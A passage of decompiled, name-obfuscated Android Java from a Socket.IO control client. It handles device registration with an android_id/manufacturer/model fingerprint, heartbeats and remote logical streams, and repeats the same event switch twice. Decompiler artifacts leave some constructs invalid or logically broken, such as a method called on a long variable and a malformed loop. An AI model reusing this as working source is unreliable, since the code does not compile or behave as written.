                                        aVarK.a(a0.u(z3, z3 ? jVarY : null, z3 ? "" : "stale"));
                                        return;
                                    }
                                    return;
                                } catch (RuntimeException unused5) {
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(false, jVarY, "callback_failed"));
                                        return;
                                    }
                                    return;
                                }
                            } catch (IOException unused6) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "invalid"));
                                    return;
                                }
                                return;
                            }
                        case 2:
                            a0 a0Var3 = this;
                            if (a0Var3.f1528s.get()) {
                                boolean z4 = true;
                                boolean z5 = !a0Var3.W && a0Var3.N.get() == null;
                                long j3 = a0Var3.f1533x.get();
                                if (!z5) {
                                    a0Var3.f1533x.incrementAndGet();
                                }
                                String strValueOf = (objArr == null || objArr.length <= 0) ? "socket disconnected" : String.valueOf(objArr[0]);
                                IOException iOException = new IOException("socket.io disconnected: ".concat(strValueOf));
                                z zVar = (z) a0Var3.R.getAndSet(null);
                                b bVar2 = (b) ((AtomicReference) a0Var3.f1520j.f5973e).get();
                                if (zVar == null && bVar2.f1543d == null) {
                                    z4 = false;
                                }
                                a0Var3.f1516h.getClass();
                                boolean z6 = z4;
                                long jElapsedRealtime = SystemClock.elapsedRealtime();
                                int i12 = z6 ? 5 : 4;
                                if (zVar == null) {
                                    if (bVar2 == null || (th2 = bVar2.f1543d) == null) {
                                        th = iOException;
                                    }
                                    z2 = z5;
                                    if (a0Var3.V <= 0) {
                                        jMax = -1;
                                    } else {
                                        jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                    }
                                    gVarR = a0Var3.R(h2.g.l(i12, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                    a0Var3.U = gVarR;
                                    a0Var3.f(iOException);
                                    a0Var3.I(t.f1734d, jElapsedRealtime);
                                    Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                    if (z2) {
                                        a0Var3.F(strValueOf, iOException, gVarR);
                                        return;
                                    }
                                    try {
                                        j jVar12 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                        a0Var3.f1516h.getClass();
                                        a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar12), 250L, TimeUnit.MILLISECONDS);
                                        return;
                                    } catch (RejectedExecutionException unused7) {
                                        return;
                                    }
                                }
                                th2 = zVar.f1830a;
                                th = th2;
                                z2 = z5;
                                if (a0Var3.V <= 0) {
                                    jMax = -1;
                                } else {
                                    jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                }
                                gVarR = a0Var3.R(h2.g.l(i12, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                a0Var3.U = gVarR;
                                a0Var3.f(iOException);
                                a0Var3.I(t.f1734d, jElapsedRealtime);
                                Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                if (z2) {
                                    a0Var3.F(strValueOf, iOException, gVarR);
                                    return;
                                }
                                j jVar13 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                a0Var3.f1516h.getClass();
                                a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar13), 250L, TimeUnit.MILLISECONDS);
                                return;
                            }
                            return;
                        case 3:
                            a0 a0Var4 = this;
                            if (a0Var4.f1528s.get()) {
                                Throwable th4 = null;
                                if (objArr != null) {
                                    for (Object obj : objArr) {
                                        if (obj instanceof Throwable) {
                                            th4 = (Throwable) obj;
                                        }
                                    }
                                }
                                z zVar2 = (z) a0Var4.R.get();
                                b bVar3 = (b) ((AtomicReference) a0Var4.f1520j.f5973e).get();
                                if (th4 == null && zVar2 != null) {
                                    th4 = zVar2.f1830a;
                                }
                                if (th4 == null && (th3 = bVar3.f1543d) != null) {
                                    th4 = th3;
                                }
                                Throwable th5 = zVar2 == null ? th4 : zVar2.f1830a;
                                IOException iOException2 = th4 instanceof IOException ? (IOException) th4 : new IOException("socket.io connect error".concat(th4 == null ? "" : ": ".concat(th4.getClass().getSimpleName())), th4);
                                a0Var4.f1516h.getClass();
                                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                                a0Var4.U = a0Var4.R(h2.g.l(5, th5 == null ? iOException2 : th5, a0Var4.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime2 - a0Var4.V), a0Var4.p()), jElapsedRealtime2, zVar2, bVar3);
                                Log.w("SocketControlClient", "control connect error ".concat(a0Var4.U.e()));
                                if (!a0Var4.f1532w.compareAndSet(false, true) || (jVar2 = a0Var4.f1508d) == null) {
                                    return;
                                }
                                ((cf) jVar2.f1415d).f3702f.execute(new qe(jVar2, jVar2.f1413b, (AtomicReference) jVar2.f1414c, iOException2, a0Var4.U, 1));
                                return;
                            }
                            return;
                        case 4:
                            a0 a0Var5 = this;
                            a0Var5.v(a0Var5.f1533x.get(), objArr);
                            return;
                        case 5:
                            a0 a0Var6 = this;
                            JSONObject jSONObjectL2 = a0.l(objArr);
                            h2.e eVar2 = (h2.e) a0Var6.N.get();
                            if (jSONObjectL2 == null || eVar2 == null || !a0.q(jSONObjectL2, eVar2.f1982d)) {
                                return;
                            }
                            a0Var6.t();
                            a0Var6.C(jSONObjectL2, eVar2);
                            long jO = a0.o(jSONObjectL2);
                            a0Var6.f1516h.getClass();
                            long jElapsedRealtime3 = SystemClock.elapsedRealtime();
                            JSONObject jSONObjectN = a0.n(eVar2.f1982d, jO, jElapsedRealtime3);
                            w0.a aVarK2 = a0.k(objArr);
                            if (aVarK2 != null) {
                                aVarK2.a(jSONObjectN);
                            }
                            a0Var6.j("heartbeat:ack", jSONObjectN, jO, jElapsedRealtime3);
                            a0Var6.m();
                            return;
                        case 6:
                            a0 a0Var7 = this;
                            JSONObject jSONObjectL3 = a0.l(objArr);
                            h2.e eVar3 = (h2.e) a0Var7.N.get();
                            if (jSONObjectL3 == null || eVar3 == null || !a0.q(jSONObjectL3, eVar3.f1982d)) {
                                return;
                            }
                            long jO2 = a0.o(jSONObjectL3);
                            long j4 = a0Var7.G.get();
                            long j5 = a0Var7.H.get();
                            if (jO2 <= 0 || (jO2 <= j4 && jO2 > j5)) {
                                a0Var7.f1516h.getClass();
                                long jElapsedRealtime4 = SystemClock.elapsedRealtime();
                                a0Var7.D.set(jElapsedRealtime4);
                                a0Var7.s(jElapsedRealtime4, jO2, (jO2 <= 0 || jO2 != j4) ? -1L : a0Var7.F.get());
                                a0Var7.C(jSONObjectL3, eVar3);
                                a0Var7.m();
                                return;
                            }
                            long jIncrementAndGet2 = a0Var7.B.incrementAndGet();
                            StringBuilder sbJ2 = a0.a.j(jO2, "invalid Socket.IO heartbeat ACK event=heartbeat:ack sequence=", " lastSentSequence=");
                            sbJ2.append(j4);
                            j4.d(sbJ2, " lastAckSequence=", j5, " count=");
                            sbJ2.append(jIncrementAndGet2);
                            Log.w("SocketControlClient", sbJ2.toString());
                            return;
                        case 7:
                            a0 a0Var8 = this;
                            b1 b1Var = (b1) a0Var8.Q.get();
                            JSONObject jSONObjectL4 = a0.l(objArr);
                            w0.a aVarK3 = a0.k(objArr);
                            long jOptLong = 0;
                            if (b1Var == null || jSONObjectL4 == null) {
                                if (aVarK3 != null) {
                                    String strOptString = "";
                                    try {
                                        JSONObject jSONObjectPut5 = new JSONObject().put("version", 1);
                                        if (jSONObjectL4 != null) {
                                            strOptString = jSONObjectL4.optString("requestId", "");
                                        }
                                        JSONObject jSONObjectPut6 = jSONObjectPut5.put("requestId", strOptString);
                                        if (jSONObjectL4 != null) {
                                            jOptLong = jSONObjectL4.optLong("generation", 0L);
                                        }
                                        aVarK3.a(jSONObjectPut6.put("generation", jOptLong).put("ok", false).put("error", new JSONObject().put("code", "session_closed").put("message", "logical stream unavailable")));
                                        return;
                                    } catch (JSONException e4) {
                                        throw new IllegalStateException(e4);
                                    }
                                }
                                return;
                            }
                            Object obj2 = null;
                            try {
                                a1 a1VarH = b1Var.h(jSONObjectL4, true);
                                if (b1.e(a1VarH.f1537b)) {
                                    synchronized (b1Var.f1545a) {
                                        try {
                                            if (b1Var.f1550f) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "session_closed", "control session is closed"), obj2);
                                            } else if (b1Var.f1546b.size() >= 128) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "stream_limit", "logical stream limit reached"), obj2);
                                            } else if (b1Var.f1546b.containsKey((String) a1VarH.f1538c)) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "duplicate_request", "logical stream requestId already exists"), obj2);
                                            } else {
                                                d0 d0Var = new d0(b1Var, (String) a1VarH.f1538c, a1VarH.f1537b, a1VarH.f1536a);
                                                b1Var.f1546b.put((String) a1VarH.f1538c, d0Var);
                                                JSONObject jSONObjectG = b1.g((String) a1VarH.f1538c, a1VarH.f1536a);
                                                try {
                                                    jSONObjectG.put("ok", true);
                                                    lVar3 = new y.l(jSONObjectG, d0Var);
                                                } catch (JSONException e5) {
                                                    throw new IllegalStateException(e5);
                                                }
                                            }
                                        } catch (Throwable th6) {
                                            throw th6;
                                        }
                                    }
                                } else {
                                    lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "unsupported_channel", "unsupported logical stream channel"), obj2);
                                }
                            } catch (IOException e6) {
                                lVar3 = new y.l(b1.i(jSONObjectL4.optLong("generation", 0L), jSONObjectL4.optString("requestId", ""), "invalid_stream_open", e6.getMessage()), obj2);
                            }
                            if (aVarK3 == null) {
                                d0 d0Var2 = (d0) lVar3.f5992d;
                                if (d0Var2 != null) {
                                    d0Var2.d(new IOException("stream:open ACK callback missing"), true);
                                    return;
                                }
                                return;
                            }
                            try {
                                aVarK3.a((JSONObject) lVar3.f5991c);
                                if (((d0) lVar3.f5992d) == null) {
                                    return;
                                }
                                a0Var8.t();
                                try {
                                    a0Var8.f1527r.execute(new e2.q0(a0Var8, b1Var, lVar3, 1));
                                    return;
                                } catch (RejectedExecutionException e7) {
                                    ((d0) lVar3.f5992d).d(new IOException("logical stream dispatcher stopped", e7), true);
                                    return;
                                }
                            } catch (RuntimeException e8) {
                                d0 d0Var3 = (d0) lVar3.f5992d;
                                if (d0Var3 != null) {
                                    d0Var3.d(new IOException("stream:open ACK failed", e8), true);
                                    return;
                                }
                                return;
                            }
                            break;
                        case 8:
                            a0 a0Var9 = this;
                            b1 b1Var2 = (b1) a0Var9.Q.get();
                            JSONObject jSONObjectL5 = a0.l(objArr);
                            if (b1Var2 == null || jSONObjectL5 == null) {
                                return;
                            }
                            IOException iOException3 = null;
                            if (objArr == null) {
                                bArr = null;
                            } else {
                                int length = objArr.length;
                                int i13 = 0;
                                int i14 = 0;
                                bArr = null;
                                while (true) {
                                    if (i13 < length) {
                                        Object obj3 = objArr[i13];
                                        if ((obj3 instanceof JSONObject) || (obj3 instanceof Map)) {
                                            i14++;
                                        } else if (obj3 instanceof byte[]) {
                                            if (bArr == null) {
                                                bArr = (byte[]) obj3;
                                            }
                                        } else if (!(obj3 instanceof w0.a)) {
                                        }
                                        i13++;
                                    } else if (i14 != 1) {
                                    }
                                    bArr = null;
                                }
                            }
                            try {
                                a1 a1VarH2 = b1Var2.h(jSONObjectL5, false);
                                d0 d0VarF3 = b1Var2.f((String) a1VarH2.f1538c);
                                if (d0VarF3 == null) {
                                    b1Var2.b(a1VarH2.f1536a, (String) a1VarH2.f1538c, "unknown_stream");
                                    e = new IOException("unknown logical stream");
                                } else {
                                    if (bArr == null || !q2.c.s(bArr.length)) {
                                        iOException3 = new IOException("logical stream payload exceeds 32 MiB");
                                    } else {
                                        int length2 = bArr.length;
                                        AtomicLong atomicLong = d0VarF3.f1570c.f1547c;
                                        if (length2 < 0 || length2 > 33554432) {
                                            iOException3 = new IOException("logical stream control buffer full");
                                        } else {
                                            while (true) {
                                                long j6 = atomicLong.get();
                                                long j7 = length2;
                                                if (j7 > 67108864 - j6) {
                                                    iOException3 = new IOException("logical stream control buffer full");
                                                } else if (atomicLong.compareAndSet(j6, j7 + j6)) {
                                                    byte[] bArr2 = (byte[]) bArr.clone();
                                                    synchronized (d0VarF3.f1574g) {
                                                        try {
                                                            if (d0VarF3.f1582p || d0VarF3.f1581o) {
                                                                b1 b1Var3 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var3.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var3.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream closed");
                                                            } else if (d0VarF3.f1576i.size() >= 32 || length2 > 33554432 - d0VarF3.n) {
                                                                b1 b1Var4 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var4.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var4.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream inbound queue full");
                                                            } else {
                                                                d0VarF3.f1576i.addLast(bArr2);
                                                                d0VarF3.n += length2;
                                                                d0VarF3.f1574g.notifyAll();
                                                            }
                                                        } catch (Throwable th7) {
                                                            throw th7;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    if (iOException3 != null) {
                                        d0VarF3.d(iOException3, true);
                                    }
                                    e = iOException3;
                                }
                            } catch (IOException e9) {
                                e = e9;
                                String strOptString2 = jSONObjectL5.optString("requestId", "");
                                if (!strOptString2.isEmpty() && (d0VarF = b1Var2.f(strOptString2)) != null) {
                                    d0VarF.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var9.t();
                                return;
                            }
                            return;
                        case 9:
                            a0 a0Var10 = this;
                            b1 b1Var5 = (b1) a0Var10.Q.get();
                            JSONObject jSONObjectL6 = a0.l(objArr);
                            if (b1Var5 == null || jSONObjectL6 == null) {
                                return;
                            }
                            try {
                                d0 d0VarF4 = b1Var5.f((String) b1Var5.h(jSONObjectL6, false).f1538c);
                                if (d0VarF4 != null) {
                                    String strOptString3 = jSONObjectL6.optString("reason", "");
                                    synchronized (d0VarF4.f1574g) {
                                        try {
                                            if (!d0VarF4.f1582p && !d0VarF4.f1581o) {
                                                d0VarF4.f1581o = true;
                                                if (strOptString3 != null && !strOptString3.isEmpty() && !"closed".equals(strOptString3) && !"eof".equals(strOptString3)) {
                                                    if (strOptString3.length() > 256) {
                                                        strOptString3 = strOptString3.substring(0, 256);
                                                    }
                                                    d0VarF4.f1583q = new IOException("remote logical stream closed: ".concat(strOptString3));
                                                }
                                                d0VarF4.f1574g.notifyAll();
                                            }
                                        } catch (Throwable th8) {
                                            throw th8;
                                        }
                                    }
                                }
                                e = null;
                            } catch (IOException e10) {
                                e = e10;
                                String strOptString4 = jSONObjectL6.optString("requestId", "");
                                if (!strOptString4.isEmpty() && (d0VarF2 = b1Var5.f(strOptString4)) != null) {
                                    d0VarF2.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var10.t();
                                return;
                            }
                            return;
                        case 10:
                            a0 a0Var11 = this;
                            if (a0Var11.f1528s.get() && a0Var11.N.get() == null && (jSONObjectL = a0.l(objArr)) != null) {
                                a0Var11.t();
                                h2.m mVarA = a0.A(jSONObjectL);
                                if (mVarA != null) {
                                    a0Var11.D(a0Var11.f1533x.get(), mVarA);
                                    return;
                                }
                                return;
                            }
                            return;
                        default:
                            a0 a0Var12 = this;
                            String strC = "";
                            Throwable th9 = null;
                            if (objArr != null) {
                                for (Object obj4 : objArr) {
                                    if (obj4 instanceof Throwable) {
                                        th9 = (Throwable) obj4;
                                    }
                                }
                            }
                            if (th9 == null) {
                                return;
                            }
                            String str8 = "websocket";
                            if (th9 instanceof y0.a) {
                                y0.a aVar2 = (y0.a) th9;
                                String strC2 = a0.c(aVar2.f6035c, 24);
                                str8 = strC2.isEmpty() ? "websocket" : strC2;
                                Object obj5 = aVar2.f6036d;
                                strC = a0.c(obj5 != null ? String.valueOf(obj5) : "", 64);
                            }
                            a0Var12.R.set(new z(str8, strC, th9));
                            return;
                    }
                }
            });
            final int i12 = 9;
            sVarA.c("stream:close", new x0.a() { // from class: g2.h
                /* JADX WARN: Code duplicated, block: B:371:0x0646  */
                /* JADX WARN: Code duplicated, block: B:373:0x064a  */
                /* JADX WARN: Code duplicated, block: B:378:0x06a7  */
                /* JADX WARN: Code duplicated, block: B:482:0x067f A[EXC_TOP_SPLITTER, SYNTHETIC] */
                @Override // x0.a
                public final void a(Object[] objArr) {
                    y.l lVar2;
                    Throwable th;
                    Throwable th2;
                    boolean z2;
                    long jMax;
                    h2.g gVarR;
                    g.j jVar2;
                    Throwable th3;
                    y.l lVar3;
                    byte[] bArr;
                    d0 d0VarF;
                    d0 d0VarF2;
                    JSONObject jSONObjectL;
                    switch (i12) {
                        case 0:
                            a0 a0Var = this;
                            String str2 = "";
                            if (a0Var.f1528s.get()) {
                                a0Var.f1532w.set(false);
                                d2.y yVarC = null;
                                a0Var.R.set(null);
                                t tVar = t.f1739i;
                                a0Var.f1516h.getClass();
                                a0Var.I(tVar, SystemClock.elapsedRealtime());
                                long jIncrementAndGet = a0Var.f1533x.incrementAndGet();
                                String strN = c2.u.n((Context) a0Var.f1510e.f1959a, "deviceId");
                                h2.b bVar = a0Var.f1510e;
                                Context context2 = a0Var.f1502a;
                                bVar.getClass();
                                y.r rVar = new y.r();
                                rVar.f6032a = "";
                                rVar.f6033b = "";
                                rVar.f6034c = "";
                                try {
                                    rVar.f6032a = Settings.Secure.getString(context2.getApplicationContext().getContentResolver(), "android_id");
                                } catch (Throwable unused2) {
                                    rVar.f6032a = "";
                                }
                                if (((String) rVar.f6032a) == null) {
                                    rVar.f6032a = "";
                                }
                                String str3 = Build.MANUFACTURER;
                                if (str3 == null) {
                                    str3 = "";
                                }
                                rVar.f6033b = str3;
                                String str4 = Build.MODEL;
                                if (str4 == null) {
                                    str4 = "";
                                }
                                rVar.f6034c = str4;
                                if (a0Var.T.f2035i && (lVar2 = a0Var.f1512f) != null) {
                                    try {
                                        yVarC = lVar2.c(strN, (String) a0Var.f1504b.f5973e, rVar);
                                    } catch (RuntimeException unused3) {
                                        Log.w("SocketControlClient", "control continuity attempt persistence failed");
                                    }
                                }
                                d2.y yVar = yVarC;
                                AtomicReference atomicReference = a0Var.P;
                                a0Var.f1516h.getClass();
                                atomicReference.set(new x(jIncrementAndGet, rVar, yVar, SystemClock.elapsedRealtime()));
                                String str5 = a0Var.f1506c;
                                String str6 = (String) a0Var.f1504b.f5973e;
                                h2.h hVar2 = a0Var.T;
                                try {
                                    JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("deviceId", strN);
                                    JSONObject jSONObject = new JSONObject();
                                    String str7 = (String) rVar.f6032a;
                                    if (str7 == null) {
                                        str7 = "";
                                    }
                                    JSONObject jSONObjectPut2 = jSONObjectPut.put("fingerprint", jSONObject.put("androidId", str7).put("manufacturer", (String) rVar.f6033b).put("model", (String) rVar.f6034c));
                                    if (str5 != null) {
                                        str2 = str5;
                                    }
                                    JSONObject jSONObjectPut3 = jSONObjectPut2.put("model", str2).put("appVersion", str6).put("stableCoreBehaviorId", t9.f5181l).put("coreSourceSha256", t9.f5182m).put("buildProvenance", t9.n);
                                    if (hVar2 == null) {
                                        hVar2 = new h2.h();
                                    }
                                    JSONObject jSONObjectPut4 = jSONObjectPut3.put("capabilities", a0.d(hVar2));
                                    if (yVar != null) {
                                        jSONObjectPut4.put("controlResume", new JSONObject().put("credential", (String) yVar.f651a).put("attemptId", (String) yVar.f652b).put("priorSessionId", (String) yVar.f654d).put("priorGeneration", yVar.f653c));
                                    }
                                    StringBuilder sbJ = a0.a.j(jIncrementAndGet, "control registration starting attempt=", " resumeProofPresent=");
                                    sbJ.append(yVar != null);
                                    Log.i("SocketControlClient", sbJ.toString());
                                    try {
                                        a0Var.f1514g.a("device:register", jSONObjectPut4, new k(a0Var, jIncrementAndGet, 0));
                                        return;
                                    } catch (RuntimeException unused4) {
                                        Log.w("SocketControlClient", "device registration emit failed");
                                        return;
                                    }
                                } catch (JSONException e3) {
                                    throw new IllegalStateException(e3);
                                }
                                break;
                            }
                            return;
                        case 1:
                            a0 a0Var2 = this;
                            w0.a aVarK = a0.k(objArr);
                            h2.e eVar = (h2.e) a0Var2.N.get();
                            if (!a0Var2.f1528s.get() || eVar == null || !a0Var2.T.n) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "unsupported"));
                                    return;
                                }
                                return;
                            }
                            try {
                                h2.j jVarY = a0.y(a0.l(objArr), eVar);
                                try {
                                    g.j jVar3 = a0Var2.f1508d;
                                    boolean z3 = jVar3 != null && jVar3.g(jVarY);
                                    a0Var2.t();
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(z3, z3 ? jVarY : null, z3 ? "" : "stale"));
                                        return;
                                    }
                                    return;
                                } catch (RuntimeException unused5) {
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(false, jVarY, "callback_failed"));
                                        return;
                                    }
                                    return;
                                }
                            } catch (IOException unused6) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "invalid"));
                                    return;
                                }
                                return;
                            }
                        case 2:
                            a0 a0Var3 = this;
                            if (a0Var3.f1528s.get()) {
                                boolean z4 = true;
                                boolean z5 = !a0Var3.W && a0Var3.N.get() == null;
                                long j3 = a0Var3.f1533x.get();
                                if (!z5) {
                                    a0Var3.f1533x.incrementAndGet();
                                }
                                String strValueOf = (objArr == null || objArr.length <= 0) ? "socket disconnected" : String.valueOf(objArr[0]);
                                IOException iOException = new IOException("socket.io disconnected: ".concat(strValueOf));
                                z zVar = (z) a0Var3.R.getAndSet(null);
                                b bVar2 = (b) ((AtomicReference) a0Var3.f1520j.f5973e).get();
                                if (zVar == null && bVar2.f1543d == null) {
                                    z4 = false;
                                }
                                a0Var3.f1516h.getClass();
                                boolean z6 = z4;
                                long jElapsedRealtime = SystemClock.elapsedRealtime();
                                int i13 = z6 ? 5 : 4;
                                if (zVar == null) {
                                    if (bVar2 == null || (th2 = bVar2.f1543d) == null) {
                                        th = iOException;
                                    }
                                    z2 = z5;
                                    if (a0Var3.V <= 0) {
                                        jMax = -1;
                                    } else {
                                        jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                    }
                                    gVarR = a0Var3.R(h2.g.l(i13, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                    a0Var3.U = gVarR;
                                    a0Var3.f(iOException);
                                    a0Var3.I(t.f1734d, jElapsedRealtime);
                                    Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                    if (z2) {
                                        a0Var3.F(strValueOf, iOException, gVarR);
                                        return;
                                    }
                                    try {
                                        j jVar13 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                        a0Var3.f1516h.getClass();
                                        a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar13), 250L, TimeUnit.MILLISECONDS);
                                        return;
                                    } catch (RejectedExecutionException unused7) {
                                        return;
                                    }
                                }
                                th2 = zVar.f1830a;
                                th = th2;
                                z2 = z5;
                                if (a0Var3.V <= 0) {
                                    jMax = -1;
                                } else {
                                    jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                }
                                gVarR = a0Var3.R(h2.g.l(i13, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                a0Var3.U = gVarR;
                                a0Var3.f(iOException);
                                a0Var3.I(t.f1734d, jElapsedRealtime);
                                Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                if (z2) {
                                    a0Var3.F(strValueOf, iOException, gVarR);
                                    return;
                                }
                                j jVar14 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                a0Var3.f1516h.getClass();
                                a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar14), 250L, TimeUnit.MILLISECONDS);
                                return;
                            }
                            return;
                        case 3:
                            a0 a0Var4 = this;
                            if (a0Var4.f1528s.get()) {
                                Throwable th4 = null;
                                if (objArr != null) {
                                    for (Object obj : objArr) {
                                        if (obj instanceof Throwable) {
                                            th4 = (Throwable) obj;
                                        }
                                    }
                                }
                                z zVar2 = (z) a0Var4.R.get();
                                b bVar3 = (b) ((AtomicReference) a0Var4.f1520j.f5973e).get();
                                if (th4 == null && zVar2 != null) {
                                    th4 = zVar2.f1830a;
                                }
                                if (th4 == null && (th3 = bVar3.f1543d) != null) {
                                    th4 = th3;
                                }
                                Throwable th5 = zVar2 == null ? th4 : zVar2.f1830a;
                                IOException iOException2 = th4 instanceof IOException ? (IOException) th4 : new IOException("socket.io connect error".concat(th4 == null ? "" : ": ".concat(th4.getClass().getSimpleName())), th4);
                                a0Var4.f1516h.getClass();
                                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                                a0Var4.U = a0Var4.R(h2.g.l(5, th5 == null ? iOException2 : th5, a0Var4.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime2 - a0Var4.V), a0Var4.p()), jElapsedRealtime2, zVar2, bVar3);
                                Log.w("SocketControlClient", "control connect error ".concat(a0Var4.U.e()));
                                if (!a0Var4.f1532w.compareAndSet(false, true) || (jVar2 = a0Var4.f1508d) == null) {
                                    return;
                                }
                                ((cf) jVar2.f1415d).f3702f.execute(new qe(jVar2, jVar2.f1413b, (AtomicReference) jVar2.f1414c, iOException2, a0Var4.U, 1));
                                return;
                            }
                            return;
                        case 4:
                            a0 a0Var5 = this;
                            a0Var5.v(a0Var5.f1533x.get(), objArr);
                            return;
                        case 5:
                            a0 a0Var6 = this;
                            JSONObject jSONObjectL2 = a0.l(objArr);
                            h2.e eVar2 = (h2.e) a0Var6.N.get();
                            if (jSONObjectL2 == null || eVar2 == null || !a0.q(jSONObjectL2, eVar2.f1982d)) {
                                return;
                            }
                            a0Var6.t();
                            a0Var6.C(jSONObjectL2, eVar2);
                            long jO = a0.o(jSONObjectL2);
                            a0Var6.f1516h.getClass();
                            long jElapsedRealtime3 = SystemClock.elapsedRealtime();
                            JSONObject jSONObjectN = a0.n(eVar2.f1982d, jO, jElapsedRealtime3);
                            w0.a aVarK2 = a0.k(objArr);
                            if (aVarK2 != null) {
                                aVarK2.a(jSONObjectN);
                            }
                            a0Var6.j("heartbeat:ack", jSONObjectN, jO, jElapsedRealtime3);
                            a0Var6.m();
                            return;
                        case 6:
                            a0 a0Var7 = this;
                            JSONObject jSONObjectL3 = a0.l(objArr);
                            h2.e eVar3 = (h2.e) a0Var7.N.get();
                            if (jSONObjectL3 == null || eVar3 == null || !a0.q(jSONObjectL3, eVar3.f1982d)) {
                                return;
                            }
                            long jO2 = a0.o(jSONObjectL3);
                            long j4 = a0Var7.G.get();
                            long j5 = a0Var7.H.get();
                            if (jO2 <= 0 || (jO2 <= j4 && jO2 > j5)) {
                                a0Var7.f1516h.getClass();
                                long jElapsedRealtime4 = SystemClock.elapsedRealtime();
                                a0Var7.D.set(jElapsedRealtime4);
                                a0Var7.s(jElapsedRealtime4, jO2, (jO2 <= 0 || jO2 != j4) ? -1L : a0Var7.F.get());
                                a0Var7.C(jSONObjectL3, eVar3);
                                a0Var7.m();
                                return;
                            }
                            long jIncrementAndGet2 = a0Var7.B.incrementAndGet();
                            StringBuilder sbJ2 = a0.a.j(jO2, "invalid Socket.IO heartbeat ACK event=heartbeat:ack sequence=", " lastSentSequence=");
                            sbJ2.append(j4);
                            j4.d(sbJ2, " lastAckSequence=", j5, " count=");
                            sbJ2.append(jIncrementAndGet2);
                            Log.w("SocketControlClient", sbJ2.toString());
                            return;
                        case 7:
                            a0 a0Var8 = this;
                            b1 b1Var = (b1) a0Var8.Q.get();
                            JSONObject jSONObjectL4 = a0.l(objArr);
                            w0.a aVarK3 = a0.k(objArr);
                            long jOptLong = 0;
                            if (b1Var == null || jSONObjectL4 == null) {
                                if (aVarK3 != null) {
                                    String strOptString = "";
                                    try {
                                        JSONObject jSONObjectPut5 = new JSONObject().put("version", 1);
                                        if (jSONObjectL4 != null) {
                                            strOptString = jSONObjectL4.optString("requestId", "");
                                        }
                                        JSONObject jSONObjectPut6 = jSONObjectPut5.put("requestId", strOptString);
                                        if (jSONObjectL4 != null) {
                                            jOptLong = jSONObjectL4.optLong("generation", 0L);
                                        }
                                        aVarK3.a(jSONObjectPut6.put("generation", jOptLong).put("ok", false).put("error", new JSONObject().put("code", "session_closed").put("message", "logical stream unavailable")));
                                        return;
                                    } catch (JSONException e4) {
                                        throw new IllegalStateException(e4);
                                    }
                                }
                                return;
                            }
                            Object obj2 = null;
                            try {
                                a1 a1VarH = b1Var.h(jSONObjectL4, true);
                                if (b1.e(a1VarH.f1537b)) {
                                    synchronized (b1Var.f1545a) {
                                        try {
                                            if (b1Var.f1550f) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "session_closed", "control session is closed"), obj2);
                                            } else if (b1Var.f1546b.size() >= 128) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "stream_limit", "logical stream limit reached"), obj2);
                                            } else if (b1Var.f1546b.containsKey((String) a1VarH.f1538c)) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "duplicate_request", "logical stream requestId already exists"), obj2);
                                            } else {
                                                d0 d0Var = new d0(b1Var, (String) a1VarH.f1538c, a1VarH.f1537b, a1VarH.f1536a);
                                                b1Var.f1546b.put((String) a1VarH.f1538c, d0Var);
                                                JSONObject jSONObjectG = b1.g((String) a1VarH.f1538c, a1VarH.f1536a);
                                                try {
                                                    jSONObjectG.put("ok", true);
                                                    lVar3 = new y.l(jSONObjectG, d0Var);
                                                } catch (JSONException e5) {
                                                    throw new IllegalStateException(e5);
                                                }
                                            }
